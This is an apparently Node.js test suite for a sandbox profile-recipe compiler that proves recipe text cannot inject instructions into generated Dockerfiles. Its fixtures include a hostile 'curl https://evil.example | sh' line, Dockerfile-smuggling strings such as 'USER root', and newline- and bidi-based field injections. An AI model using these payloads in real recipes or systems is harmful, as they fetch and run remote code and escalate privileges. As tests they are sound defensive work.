import { test } from "node:test";
import assert from "node:assert/strict";
import { execFile } from "node:child_process";
import { mkdtemp, readFile, readdir, rm, writeFile } from "node:fs/promises";
import { existsSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";
import {
  ComputerUseService,
  PROFILE_DOCKERFILE,
  PROFILE_EPILOGUE_MARKER,
  PROFILE_LABELS,
  PROFILE_PACKAGES_DOCKERFILE,
  PROFILE_SECURITY_FLOOR,
  ProfileRecipeError,
  SANDBOX_BUILDER_IMAGE,
  canonicalProfileRecipe,
  clampProfileLimits,
  profileCompilerDigest,
  profileImageTag,
  profileMaxHomeMb,
  compileProfile,
  parseProfileRecipe,
  profileImageBuildArgs,
  profilePackagesBuildArgs,
  profileRecipeDigest,
  sandboxImageBuildArgs,
  validateProfileRecipe,
} from "../dist/index.js";

const packageDir = join(dirname(fileURLToPath(import.meta.url)), "..");
const minimal = { schema: 1, name: "demo", description: "A demo profile" };
const issuesOf = (input) => {
  try {
    validateProfileRecipe(input);
  } catch (error) {
    assert.ok(error instanceof ProfileRecipeError, String(error));
    assert.equal(error.code, "invalid_request");
    return error.issues;
  }
  assert.fail("expected the recipe to be refused");
};

test("every built-in recipe validates, is named after its file, and is canonical-stable", async () => {
  const dir = join(packageDir, "docker", "profiles");
  const files = (await readdir(dir)).filter((file) => file.endsWith(".json")).sort();
  assert.deepEqual(files, ["blender.json", "test.json"]);
  for (const file of files) {
    const recipe = parseProfileRecipe(await readFile(join(dir, file), "utf8"));
    assert.equal(`${recipe.name}.json`, file);
    assert.deepEqual(parseProfileRecipe(canonicalProfileRecipe(recipe)), recipe, `${file}: canonical form round-trips`);
    for (const download of recipe.downloads) assert.match(download.sha256, /^[0-9a-f]{64}$/);
  }
  const blender = parseProfileRecipe(await readFile(join(dir, "blender.json"), "utf8"));
  assert.equal(blender.gl, "software");
  assert.ok(blender.downloads[0].url.startsWith("https://download.blender.org/"));
});

test("a minimal recipe gets every default, in canonical form", () => {
  assert.deepEqual(validateProfileRecipe(minimal), {
    schema: 1,
    name: "demo",
    description: "A demo profile",
    packages: [],
    downloads: [],
    setup: "",
    path: [],
    env: {},
    gl: "none",
    limits: {},
    architectures: [],
  });
  // setup as lines is the same recipe as setup as one string; trailing whitespace is normalised.
  const a = validateProfileRecipe({ ...minimal, setup: ["echo a", "echo b"] });
  const b = validateProfileRecipe({ ...minimal, setup: "echo a\necho b\n\n  " });
  assert.equal(a.setup, "echo a\necho b\n");
  assert.equal(profileRecipeDigest(a), profileRecipeDigest(b));
  // Key order does not change the digest; content does.
  const reordered = { description: "A demo profile", name: "demo", schema: 1, env: { B: "2", A: "1" } };
  assert.equal(profileRecipeDigest(validateProfileRecipe(reordered)), profileRecipeDigest(validateProfileRecipe({ ...minimal, env: { A: "1", B: "2" } })));
  assert.notEqual(profileRecipeDigest(a), profileRecipeDigest(validateProfileRecipe({ ...minimal, setup: "echo a\necho c" })));
});

test("validation refuses with exact, path-prefixed errors", () => {
  const cases = [
    [null, "recipe: must be a JSON object"],
    [{ ...minimal, schema: 2 }, "schema: must be 1"],
    [
      { ...minimal, extra: 1 },
      "extra: is not a recipe field (allowed: schema, name, description, packages, downloads, setup, path, env, gl, limits, architectures)",
    ],
    [
      { ...minimal, name: "Blender" },
      'name: "Blender" must be 2–32 characters: lowercase letters, digits and "-", starting with a letter and not ending with "-"',
    ],
    [{ ...minimal, name: "base" }, 'name: "base" is reserved'],
    [{ ...minimal, description: "two\nlines" }, "description: must be one line of plain text (no control, line-separator or bidi characters)"],
    [{ ...minimal, description: "evil \u202e txt" }, "description: must be one line of plain text (no control, line-separator or bidi characters)"],
    [
      { ...minimal, packages: ["libfoo=1.2"] },
      'packages[0]: "libfoo=1.2" is not a Debian package name (2–100 characters: lowercase letters, digits, "+", "-" and ".", starting and ending with a letter or digit; no versions, architectures, releases or paths)',
    ],
    [{ ...minimal, packages: ["vim", "vim"] }, 'packages[1]: "vim" is listed twice'],
    [
      { ...minimal, downloads: [{ url: "http://example.com/a.tgz", sha256: "a".repeat(64), dest: "a", unpack: "tar.gz" }] },
      'downloads[0].url: "http://example.com/a.tgz" must be https://',
    ],
    [
      { ...minimal, downloads: [{ url: "https://example.com/a.tgz", dest: "a", unpack: "tar.gz" }] },
      "downloads[0].sha256: is required: the file's SHA-256 as 64 lowercase hex digits",
    ],
    [
      { ...minimal, downloads: [{ url: "https://example.com/a", sha256: "a".repeat(64), dest: "computer-use", unpack: "zip" }] },
      "downloads[0].dest: /opt/computer-use is reserved",
    ],
    [
      { ...minimal, downloads: [{ url: "https://example.com/a", sha256: "a".repeat(64), dest: "x", unpack: "zip", stripComponents: 1 }] },
      "downloads[0].stripComponents: applies only to tar.gz and tar.xz",
    ],
    [
      { ...minimal, downloads: [{ url: "https://example.com/a", sha256: "a".repeat(64), dest: "x", unpack: "file" }] },
      'downloads[0].filename: is required for unpack "file": a plain file name (letters, digits, ".", "_" and "-")',
    ],
    [
      { ...minimal, path: ["/opt/x/../etc"] },
      'path[0]: "/opt/x/../etc" must be an absolute directory under /opt or /usr (letters, digits, ".", "_", "+" and "-"; no "." or ".." segments)',
    ],
    [{ ...minimal, env: { LD_PRELOAD: "/opt/x.so" } }, 'env.LD_PRELOAD: is reserved (set by Callboard; use "path" for PATH)'],
    [{ ...minimal, env: { PATH: "/x" } }, 'env.PATH: is reserved (set by Callboard; use "path" for PATH)'],
    [{ ...minimal, env: { lower: "x" } }, "env.lower: is not a variable name (uppercase letters, digits and _, not starting with a digit)"],
    [{ ...minimal, env: { GOOD: "a\nEVIL=1" } }, "env.GOOD: must be one line without control characters"],
    [{ ...minimal, gl: "hardware" }, 'gl: must be "none" or "software"'],
    [{ ...minimal, limits: { cpus: 0.333 } }, "limits.cpus: must be a number in steps of 0.01 from 0.5 to 32"],
    [{ ...minimal, limits: { sessionMinutes: 10000 } }, "limits.sessionMinutes: must be a whole number from 5 to 480"],
    [{ ...minimal, limits: { gpu: 1 } }, "limits.gpu: is not a limit (allowed: cpus, memoryMb, homeMb, sessionMinutes)"],
    [
      { ...minimal, setup: "echo a\r\necho b" },
      "setup: must not contain control characters other than newline and tab (no carriage returns, NULs, line separators or bidi overrides)",
    ],
    [{ ...minimal, setup: ["ok", "two\nlines"] }, "setup: as an array, must hold one string per line, none containing a newline"],
  ];
  for (const [input, expected] of cases) assert.deepEqual(issuesOf(input), [expected], JSON.stringify(input));
  // Every problem is reported at once, not just the first.
  assert.equal(issuesOf({ schema: 1, name: "X", description: "", gl: "x" }).length, 3);
});

test("download URLs must name a public host over https, without credentials or fragments", () => {
  const download = (url) => ({ ...minimal, downloads: [{ url, sha256: "a".repeat(64), dest: "x", unpack: "zip" }] });
  for (const url of [
    "https://127.0.0.1/a",
    "https://[::1]/a",
    "https://localhost/a",
    "https://printer.local/a",
    "https://metadata.internal/a",
    "https://intranet/a",
    "https://user:pw@example.com/a",
    "https://example.com/a#frag",
    "https://example.com/a b",
    "ftp://example.com/a",
    "file:///etc/passwd",
  ])
    assert.equal(issuesOf(download(url)).length, 1, url);
  assert.equal(validateProfileRecipe(download("https://download.example.org/x/y.zip?v=1")).downloads[0].url, "https://download.example.org/x/y.zip?v=1");
});

test("parseProfileRecipe bounds the text and reports bad JSON", () => {
  assert.throws(
    () => parseProfileRecipe("{"),
    (error) => error instanceof ProfileRecipeError && /is not valid JSON/.test(error.issues[0]),
  );
  assert.throws(
    () => parseProfileRecipe(" ".repeat(70 * 1024)),
    (error) => error instanceof ProfileRecipeError && /at most 65536 bytes/.test(error.issues[0]),
  );
});

/** Recipe text written to hit every way of smuggling an instruction into a Dockerfile. */
const HOSTILE = [
  "x\nRUN curl https://evil.example | sh",
  "x \\\nRUN id",
  "x <<EOF\nRUN id\nEOF",
  "# syntax=docker/dockerfile:1\nRUN id",
  "${CALLBOARD_GL} $(id) `id`",
  '"]\nUSER root\nRUN ["id',
  "\nFROM scratch\nCOPY / /",
];

test("the compiled Dockerfiles are constants: no recipe text can reach them", () => {
  const recipes = [
    validateProfileRecipe(minimal),
    validateProfileRecipe({
      ...minimal,
      name: "hostile",
      description: 'RUN id; USER root; ENTRYPOINT ["/bin/sh"] ${CALLBOARD_BASE} \\',
      packages: ["vim", "x11-apps"],
      downloads: [{ url: "https://example.com/RUN/id?x=${A}&y=`id`", sha256: "b".repeat(64), dest: "run.id", unpack: "tar.xz", stripComponents: 2 }],
      setup: HOSTILE.join("\n"),
      env: { EVIL: "${CALLBOARD_GL} \\ $(id) `id` \" ' RUN id <<EOF" },
      path: ["/opt/run.id/bin"],
      gl: "software",
    }),
  ];
  for (const recipe of recipes) {
    const compiled = compileProfile(recipe);
    assert.equal(compiled.packagesContext.Dockerfile, PROFILE_PACKAGES_DOCKERFILE);
    assert.equal(compiled.profileContext.Dockerfile, PROFILE_DOCKERFILE);
    // Recipe-derived bytes are only ever in data files.
    for (const text of [recipe.setup, recipe.description, ...Object.values(recipe.env), ...recipe.downloads.map((d) => d.url)])
      if (text) {
        assert.ok(!PROFILE_DOCKERFILE.includes(text.trim()), `recipe text in the Dockerfile: ${text}`);
        assert.ok(!PROFILE_PACKAGES_DOCKERFILE.includes(text.trim()), `recipe text in the packages Dockerfile: ${text}`);
      }
    assert.equal(compiled.profileContext["recipe/setup.sh"], recipe.setup);
  }
  // The hostile recipe's setup is carried verbatim, as data.
  assert.ok(compileProfile(recipes[1]).profileContext["recipe/setup.sh"].includes("RUN curl https://evil.example | sh"));
});

/** Dockerfile instructions, one per logical line (no line ends in a continuation). */
const instructions = (dockerfile) =>
  dockerfile
    .split("\n")
    .filter((line) => line.trim() && !line.trimStart().startsWith("#"))
    .map((line) => line.trim());

test("the Dockerfiles have no continuations, heredocs or parser directives, and the epilogue is present and last", () => {
  for (const dockerfile of [PROFILE_DOCKERFILE, PROFILE_PACKAGES_DOCKERFILE]) {
    for (const line of dockerfile.split("\n")) {
      assert.ok(!line.trimEnd().endsWith("\\"), `continuation: ${line}`);
      assert.ok(!line.includes("<<"), `heredoc: ${line}`);
      assert.ok(!/^#\s*(syntax|escape|check)\s*=/i.test(line), `parser directive: ${line}`);
    }
    // Every RUN is exec form, so no shell parses the Dockerfile line.
    for (const line of instructions(dockerfile).filter((l) => l.startsWith("RUN")))
      assert.match(line, /^RUN \["\/bin\/sh", "-eu", "\/callboard-[a-z]+\/[a-z-]+\.sh"(, "[a-z]+")?\]$/);
  }
  const lines = PROFILE_DOCKERFILE.split("\n");
  const marker = lines.indexOf(PROFILE_EPILOGUE_MARKER);
  assert.ok(marker > 0, "epilogue marker");
  const before = instructions(lines.slice(0, marker).join("\n"));
  const after = instructions(lines.slice(marker + 1).join("\n"));
  // Every recipe-influenced step is before the marker, and runs as the desktop user once packages are in.
  const lastFrom = before.findLastIndex((line) => line.startsWith("FROM "));
  assert.deepEqual(
    before.slice(lastFrom).filter((line) => line.startsWith("RUN") || line.startsWith("USER")),
    [
      "USER root",
      'RUN ["/bin/sh", "-eu", "/callboard-build/run-setup.sh", "prepare"]',
      "USER desktop",
      'RUN ["/bin/sh", "-eu", "/callboard-build/run-setup.sh", "run"]',
    ],
  );
  // After it: Callboard's steps only, in this order, ending as root with the trusted entrypoint.
  assert.deepEqual(after, [
    "USER root",
    "COPY callboard/harden.sh /callboard-epilogue/harden.sh",
    'RUN ["/bin/sh", "-eu", "/callboard-epilogue/harden.sh"]',
    "COPY --from=trusted /etc/passwd /etc/group /etc/shadow /etc/gshadow /etc/nsswitch.conf /etc/",
    "COPY --from=trusted /usr/local/bin/start-desktop.sh /usr/local/bin/start-desktop.sh",
    "COPY --from=trusted /usr/local/lib/computer-use/ /usr/local/lib/computer-use/",
    "COPY --from=trusted /opt/computer-use/ /opt/computer-use/",
    "COPY --from=trusted /usr/bin/tini /usr/bin/tini",
    "COPY --from=trusted /usr/local/bin/node /usr/local/bin/node",
    "COPY recipe/profile.env /etc/computer-use/profile.env",
    "COPY callboard/verify.sh /callboard-epilogue/verify.sh",
    'RUN ["/bin/sh", "-eu", "/callboard-epilogue/verify.sh"]',
    "ENV COMPUTER_USE_GL=${CALLBOARD_GL}",
    "WORKDIR /",
    "USER root",
    'ENTRYPOINT ["/usr/local/bin/start-desktop.sh"]',
    "CMD []",
  ]);
  // The setup and unpack steps are the only desktop-user RUNs, and only after USER desktop.
  assert.equal(PROFILE_DOCKERFILE.match(/USER desktop/g).length, 2);
});

test("the data files hold only validated, one-item-per-line content", () => {
  const recipe = validateProfileRecipe({
    ...minimal,
    packages: ["x11-apps"],
    downloads: [
      { url: "https://example.com/a.tar.xz", sha256: "c".repeat(64), dest: "app", unpack: "tar.xz", stripComponents: 1 },
      { url: "https://example.com/tool", sha256: "d".repeat(64), dest: "tool", unpack: "file", filename: "tool", executable: true },
    ],
    path: ["/opt/app/bin"],
    env: { APP_HOME: "/opt/app", SPACED: "a b $(not run)" },
    gl: "software",
  });
  const c = compileProfile(recipe);
  const packages = c.packagesContext["packages.txt"].trimEnd().split("\n");
  assert.deepEqual(packages, ["x11-apps", "libgl1", "libgl1-mesa-dri", "libglx-mesa0", "libegl1", "libegl-mesa0"]);
  for (const line of packages) assert.match(line, /^[a-z0-9][a-z0-9+.-]*[a-z0-9]$/);
  assert.equal(c.profileContext["recipe/downloads.tsv"], "0\tapp\ttar.xz\t1\t-\t0\n1\ttool\tfile\t0\ttool\t1\n");
  assert.deepEqual(c.downloads, [
    { index: 0, url: "https://example.com/a.tar.xz", sha256: "c".repeat(64) },
    { index: 1, url: "https://example.com/tool", sha256: "d".repeat(64) },
  ]);
  const env = c.profileContext["recipe/profile.env"].trimEnd().split("\n").slice(1);
  assert.deepEqual(env, ["PATH=/opt/app/bin:/usr/local/bin:/usr/bin:/bin", "APP_HOME=/opt/app", "SPACED=a b $(not run)"]);
  assert.equal(c.gl, "software");
  assert.equal(compileProfile(validateProfileRecipe(minimal)).packagesContext["packages.txt"], "");
});

test("profile-env exports values verbatim and runs nothing from the file", async () => {
  const dir = await mkdtemp(join(tmpdir(), "profile-env-"));
  try {
    const marker = join(dir, "ran");
    await writeFile(
      join(dir, "env"),
      [
        "# comment",
        "",
        `SUBST=$(touch ${marker})`,
        `TICKS=\`touch ${marker}\``,
        "SPACES=a  b ; c",
        "1BAD=x",
        "bad-name=x",
        "NOEQUALS",
        "PATH=/opt/x:/usr/bin:/bin",
      ].join("\n"),
    );
    const out = await new Promise((resolve, reject) =>
      execFile(
        "/bin/sh",
        [join(packageDir, "docker", "profile-env.sh"), join(dir, "env"), "/usr/bin/env"],
        { env: { PATH: "/usr/bin:/bin" } },
        (error, stdout) => (error ? reject(error) : resolve(stdout)),
      ),
    );
    const vars = Object.fromEntries(
      out
        .trim()
        .split("\n")
        .map((line) => [line.slice(0, line.indexOf("=")), line.slice(line.indexOf("=") + 1)]),
    );
    assert.equal(vars.SUBST, `$(touch ${marker})`);
    assert.equal(vars.TICKS, `\`touch ${marker}\``);
    assert.equal(vars.SPACES, "a  b ; c");
    assert.equal(vars.PATH, "/opt/x:/usr/bin:/bin");
    assert.ok(!("1BAD" in vars) && !("bad-name" in vars) && !("NOEQUALS" in vars));
    assert.ok(!existsSync(marker), "a value was executed");
    // No file (the base image): the command runs with the environment unchanged.
    const plain = await new Promise((resolve, reject) =>
      execFile("/bin/sh", [join(packageDir, "docker", "profile-env.sh"), join(dir, "missing"), "/bin/echo", "ok"], (error, stdout) =>
        error ? reject(error) : resolve(stdout),
      ),
    );
    assert.equal(plain, "ok\n");
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
});

test("the base image decides GL from its own environment, and root never reads the profile's env file", async () => {
  const entrypoint = await readFile(join(packageDir, "docker", "start-desktop.sh"), "utf8");
  assert.match(entrypoint, /gl="\$\{COMPUTER_USE_GL:-none\}"/);
  assert.match(entrypoint, /none\) glx="-extension GLX"/);
  assert.match(entrypoint, /software\)\n\s+glx="\+extension GLX"/);
  assert.match(entrypoint, /must be none or software/);
  // profile.env is named exactly once: as profile-env's argument, after setpriv dropped to desktop.
  const uses = entrypoint.split("\n").filter((line) => line.includes("profile.env") && !line.trimStart().startsWith("#"));
  assert.deepEqual(uses, ['    /bin/sh /usr/local/lib/computer-use/profile-env /etc/computer-use/profile.env "$@"']);
  const execDesktop = entrypoint.slice(entrypoint.indexOf("exec_desktop() {"), entrypoint.indexOf("}", entrypoint.indexOf("exec_desktop() {")));
  assert.ok(execDesktop.indexOf("setpriv --reuid=desktop") < execDesktop.indexOf("profile-env"));
  const dockerfile = await readFile(join(packageDir, "docker", "Dockerfile"), "utf8");
  const finalStage = dockerfile.slice(dockerfile.lastIndexOf("\nFROM "));
  assert.match(finalStage, /COMPUTER_USE_GL=none/);
  assert.match(finalStage, /purged="libgl1-mesa-dri libllvm15 libz3-4/, "the base stays GL-free");
  assert.match(dockerfile, /\nFROM \$\{NODE_IMAGE\} AS builder\n/);
  assert.ok(dockerfile.indexOf("AS builder") < dockerfile.lastIndexOf("\nFROM "), "the final image is the last (default) stage");
});

test("build arguments: the builder target, the package build, and the offline, labelled profile build", () => {
  const base = sandboxImageBuildArgs({ context: packageDir, target: "builder" });
  assert.deepEqual(base.slice(3, 7), ["--target", "builder", "-t", SANDBOX_BUILDER_IMAGE]);
  const id = (c) => `sha256:${c.repeat(64)}`;
  assert.deepEqual(profilePackagesBuildArgs({ context: "/ctx/p", builderImage: id("a"), tag: "callboard/computer-use-profile:x-packages" }), [
    "build",
    "--force-rm",
    "--build-arg",
    `CALLBOARD_BUILDER=${id("a")}`,
    "-t",
    "callboard/computer-use-profile:x-packages",
    "/ctx/p",
  ]);
  const args = profileImageBuildArgs({
    context: "/ctx/i",
    builderImage: id("a"),
    packagesImage: id("b"),
    baseImage: id("c"),
    baseContent: "e".repeat(64),
    name: "demo",
    digest: "f".repeat(64),
    gl: "software",
    tag: "callboard/computer-use-profile:demo",
  });
  assert.ok(args.includes("--network=none"));
  const after = (flag) => args.filter((_, i) => args[i - 1] === flag);
  assert.deepEqual(after("--build-arg"), [
    `CALLBOARD_BUILDER=${id("a")}`,
    `CALLBOARD_PACKAGES=${id("b")}`,
    `CALLBOARD_BASE=${id("c")}`,
    "CALLBOARD_GL=software",
  ]);
  assert.deepEqual(after("--label"), [
    `${PROFILE_LABELS.name}=demo`,
    `${PROFILE_LABELS.scope}=global`,
    `${PROFILE_LABELS.recipe}=${"f".repeat(64)}`,
    `${PROFILE_LABELS.compiler}=${profileCompilerDigest()}`,
    `${PROFILE_LABELS.baseContent}=${"e".repeat(64)}`,
    `${PROFILE_LABELS.baseImage}=${id("c")}`,
    `${PROFILE_LABELS.gl}=software`,
    `${PROFILE_LABELS.floor}=${PROFILE_SECURITY_FLOOR}`,
  ]);
  for (const bad of [{ gl: "hardware" }, { name: "Bad" }, { builderImage: "--privileged" }, { tag: "x y" }, { digest: "a\nb" }])
    assert.throws(() =>
      profileImageBuildArgs({
        context: "/c",
        builderImage: id("a"),
        packagesImage: id("b"),
        baseImage: id("c"),
        baseContent: "e",
        name: "demo",
        digest: "f",
        gl: "none",
        tag: "t:1",
        ...bad,
      }),
    );
});

test("clampProfileLimits: the request, else the default, each capped", () => {
  const defaults = { cpus: 1, memoryMb: 1024, homeMb: 512, sessionMinutes: 15 };
  const caps = { cpus: 4, memoryMb: 8192, homeMb: 4096, sessionMinutes: 120 };
  assert.deepEqual(clampProfileLimits({}, defaults, caps), { ...defaults, clamped: [] });
  assert.deepEqual(clampProfileLimits({ cpus: 8, memoryMb: 2048, sessionMinutes: 480 }, defaults, caps), {
    cpus: 4,
    memoryMb: 2048,
    homeMb: 512,
    sessionMinutes: 120,
    clamped: ["cpus", "sessionMinutes"],
  });
  // A default above a (lowered) cap is capped too.
  assert.deepEqual(clampProfileLimits({}, defaults, { ...caps, sessionMinutes: 10 }).sessionMinutes, 10);
});

test("per-session TTL: bounded by maxSessionTtlMs, defaulting to the service TTL; the variant reaches the driver and status", async () => {
  const opened = [];
  const driver = {
    kind: "native-desktop",
    lockDomain: "ttl-test",
    lockScope: "session",
    supportsVariants: true,
    probe: async () => ({ available: true, kind: "native-desktop", capabilities: [] }),
    open: async (context) => {
      opened.push(context.variant);
      return { observe: async () => ({}), act: async () => {}, releaseInput: async () => {}, close: async () => {} };
    },
  };
  const principal = { ownerId: "o", actorId: "a", role: "agent" };
  const strict = new ComputerUseService({ targets: [{ id: "t", enabled: true, driver }], authorize: () => "allow", sessionTtlMs: 60_000 });
  // Without maxSessionTtlMs a session may only be as long as the service TTL.
  await assert.rejects(strict.open(principal, "t", undefined, { ttlMs: 120_000 }), { code: "invalid_request" });
  const shorter = await strict.open(principal, "t", undefined, { ttlMs: 2_000 });
  assert.ok(shorter.expiresAt - Date.now() <= 2_000);
  await strict.dispose();

  const service = new ComputerUseService({
    targets: [{ id: "t", enabled: true, driver }],
    authorize: () => "allow",
    sessionTtlMs: 60_000,
    maxSessionTtlMs: 3_600_000,
  });
  try {
    const plain = await service.open(principal, "t");
    assert.ok(Math.abs(plain.expiresAt - Date.now() - 60_000) < 2_000);
    assert.equal(plain.variant, undefined);
    const long = await service.open(principal, "t", undefined, { ttlMs: 3_600_000, variant: "blender@0123456789abcdef" });
    assert.ok(Math.abs(long.expiresAt - Date.now() - 3_600_000) < 2_000);
    assert.equal(long.variant, "blender@0123456789abcdef");
    assert.equal(service.status(principal, long.sessionId)[0].variant, "blender@0123456789abcdef");
    assert.deepEqual(opened.slice(-2), [undefined, "blender@0123456789abcdef"]);
    for (const bad of [{ ttlMs: 3_600_001 }, { ttlMs: 999 }, { ttlMs: 1.5 }, { variant: "-x" }, { variant: "a b" }, { variant: "x".repeat(129) }, { extra: 1 }])
      await assert.rejects(service.open(principal, "t", undefined, bad), { code: "invalid_request" }, JSON.stringify(bad));
    assert.equal(opened.length, 3, "a refused open never reaches the driver");
  } finally {
    await service.dispose();
  }
  assert.throws(() => new ComputerUseService({ sessionTtlMs: 60_000, maxSessionTtlMs: 30_000 }), "the max cannot be below the default");
  assert.throws(() => new ComputerUseService({ maxSessionTtlMs: 86_400_001 }));
});

test("a per-session TTL expires the session on its own schedule", async () => {
  const closed = [];
  const driver = {
    kind: "browser",
    probe: async () => ({ available: true, kind: "browser", capabilities: [] }),
    open: async (context) => ({
      observe: async () => ({}),
      act: async () => {},
      releaseInput: async () => {},
      close: async () => closed.push(context.sessionId),
    }),
  };
  const principal = { ownerId: "o", actorId: "a", role: "agent" };
  const service = new ComputerUseService({
    targets: [{ id: "t", enabled: true, driver }],
    authorize: () => "allow",
    sessionTtlMs: 300,
    maxSessionTtlMs: 5_000,
  });
  try {
    const short = await service.open(principal, "t");
    const long = await service.open(principal, "t", undefined, { ttlMs: 1_200 });
    await new Promise((resolve) => setTimeout(resolve, 600));
    assert.equal(service.status(principal, short.sessionId)[0].state, "stopped");
    assert.equal(service.status(principal, long.sessionId)[0].state, "ready");
    await new Promise((resolve) => setTimeout(resolve, 900));
    assert.equal(service.status(principal, long.sessionId)[0].state, "stopped");
    assert.deepEqual(closed.sort(), [short.sessionId, long.sessionId].sort());
  } finally {
    await service.dispose();
  }
});

test("errors quote untrusted keys and values: no raw newline, bidi override or control character reaches a message", () => {
  const issues = issuesOf({
    ...minimal,
    "evil\nname: forged line": 1,
    env: { "A\u202eB": "x", OK: "v\u202e" },
    limits: { "gpu\n": 1 },
    downloads: [{ url: "https://example.com/a", sha256: "a".repeat(64), dest: "x", unpack: "zip", "k\u2028": 1 }],
  });
    // eslint-disable-next-line no-control-regex -- checking that no control character survives is the point
  for (const issue of issues) assert.doesNotMatch(issue, /[\u0000-\u001f\u007f-\u009f\u2028\u2029\u202a-\u202e\u2066-\u2069]/, issue);
  assert.ok(
    issues.includes(
      '"evil\\nname: forged line": is not a recipe field (allowed: schema, name, description, packages, downloads, setup, path, env, gl, limits, architectures)',
    ),
    issues.join("\n"),
  );
  assert.ok(
    issues.some((issue) => issue.startsWith('env."A\\u202eB": is not a variable name')),
    issues.join("\n"),
  );
  assert.ok(issues.includes("env.OK: must be one line without control characters"));
  assert.ok(issues.some((issue) => issue.startsWith('limits."gpu\\n": is not a limit')));
  assert.ok(issues.some((issue) => issue.startsWith('downloads[0]."k\\u2028": is not a download field')));
  // Values are escaped the same way.
  assert.deepEqual(issuesOf({ ...minimal, name: "x\u202ey" }), [
    'name: "x\\u202ey" must be 2–32 characters: lowercase letters, digits and "-", starting with a letter and not ending with "-"',
  ]);
});

test("the home is memory: a recipe may not ask for a home that leaves the desktop under its headroom, and clamping keeps it inside", () => {
  assert.equal(profileMaxHomeMb(1024), 512);
  assert.equal(profileMaxHomeMb(4096), 3072);
  assert.equal(profileMaxHomeMb(512), 256);
  assert.deepEqual(issuesOf({ ...minimal, limits: { memoryMb: 1024, homeMb: 1024 } }), [
    "limits.homeMb: must be at most 512 with memoryMb 1024: the home is memory, and the desktop needs 512 MiB of the rest",
  ]);
  assert.deepEqual(validateProfileRecipe({ ...minimal, limits: { memoryMb: 4096, homeMb: 3072 } }).limits, { memoryMb: 4096, homeMb: 3072 });
  const defaults = { cpus: 1, memoryMb: 1024, homeMb: 512, sessionMinutes: 15 };
  const caps = { cpus: 4, memoryMb: 8192, homeMb: 8192, sessionMinutes: 120 };
  // A home asked for alone, beyond what the (default) memory allows, is brought inside it.
  assert.deepEqual(clampProfileLimits({ homeMb: 4096 }, defaults, caps), { cpus: 1, memoryMb: 1024, homeMb: 512, sessionMinutes: 15, clamped: ["homeMb"] });
});

test("architectures: an optional list of amd64/arm64, canonical order, no duplicates", () => {
  assert.deepEqual(validateProfileRecipe({ ...minimal, architectures: ["arm64", "amd64"] }).architectures, ["amd64", "arm64"]);
  assert.deepEqual(validateProfileRecipe({ ...minimal, architectures: [] }).architectures, []);
  assert.deepEqual(issuesOf({ ...minimal, architectures: ["x86_64"] }), ['architectures[0]: "x86_64" must be one of amd64, arm64']);
  assert.deepEqual(issuesOf({ ...minimal, architectures: ["amd64", "amd64"] }), ['architectures[1]: "amd64" is listed twice']);
  assert.match(canonicalProfileRecipe(validateProfileRecipe({ ...minimal, architectures: ["amd64"] })), /"architectures": \[\n\s+"amd64"\n\s+\]/);
  assert.doesNotMatch(canonicalProfileRecipe(validateProfileRecipe(minimal)), /architectures/);
});

test("the recipe digest covers the recipe alone; the compiler has its own; scopes drive tags", () => {
  const a = validateProfileRecipe(minimal);
  assert.match(profileRecipeDigest(a), /^[0-9a-f]{64}$/);
  assert.notEqual(profileRecipeDigest(a), profileCompilerDigest());
  assert.equal(profileCompilerDigest(), profileCompilerDigest());
  assert.equal(profileImageTag("demo"), "callboard/computer-use-profile:demo");
  assert.equal(profileImageTag("demo", "w0123456789ab"), "callboard/computer-use-profile:w0123456789ab-demo");
  assert.throws(() => profileImageTag("demo", "w123"));
  assert.throws(() => profileImageTag("demo", "../x"));
});

test("packages install by exact name only: the script refuses apt patterns and checks what apt marked manual", () => {
  const script = compileProfile(validateProfileRecipe({ ...minimal, packages: ["netcat-openbsd"] })).packagesContext["install-packages.sh"];
  // Every name must be in apt-cache pkgnames (exact, real packages; no pure virtual ones) before apt sees it.
  assert.match(script, /apt-cache pkgnames \| LC_ALL=C sort -u > "\$known"/);
  assert.match(script, /missing="\$\(LC_ALL=C sort -u "\$list" \| LC_ALL=C comm -23 - "\$known"\)"/);
  // Afterwards, packages newly marked manual must all be listed ones.
  assert.match(script, /apt-mark showmanual \| LC_ALL=C sort -u \| LC_ALL=C comm -23 - "\$before" \| LC_ALL=C comm -23 - "\$listed"/);
  assert.ok(script.indexOf('comm -23 - "$known"') < script.indexOf("apt-get install"), "checked before installing");
});

test("a variant reaches only a driver that declares support for it", async () => {
  const plain = {
    kind: "browser",
    probe: async () => ({ available: true, kind: "browser", capabilities: [] }),
    open: async () => assert.fail("a variant must not reach a driver without supportsVariants"),
  };
  const service = new ComputerUseService({ targets: [{ id: "t", enabled: true, driver: plain }], authorize: () => "allow" });
  try {
    await assert.rejects(service.open({ ownerId: "o", actorId: "a", role: "agent" }, "t", undefined, { variant: "x" }), { code: "invalid_request" });
  } finally {
    await service.dispose();
  }
});
